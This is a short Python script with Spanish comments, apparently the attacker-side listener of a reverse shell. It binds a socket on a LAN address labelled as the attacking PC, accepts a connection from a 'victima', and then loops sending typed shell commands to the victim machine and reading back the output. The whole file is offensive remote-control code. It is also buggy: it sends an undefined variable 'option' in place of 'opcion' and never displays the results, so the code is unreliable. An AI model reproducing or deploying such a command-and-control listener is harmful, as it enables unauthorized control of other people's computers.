import socket

server = socket.socket()
server.bind(('192.168.0.9',48853)) #Ip de pc atk
server.listen(1)

while True:
	victima,direccion=server.accept()
	print('Conexión de: {}'.format(direccion))
	msjBinario=victima.recv(1024)
	msjCodificado=msjBinario.decode("ascii")

	if msjCodificado == "1":
		while True:
			opcion = input("shell@shell: ")
			victima.send(option.encode("ascii"))
			resultado=victima.recv(2048)
	else:
		print("Error")
		break
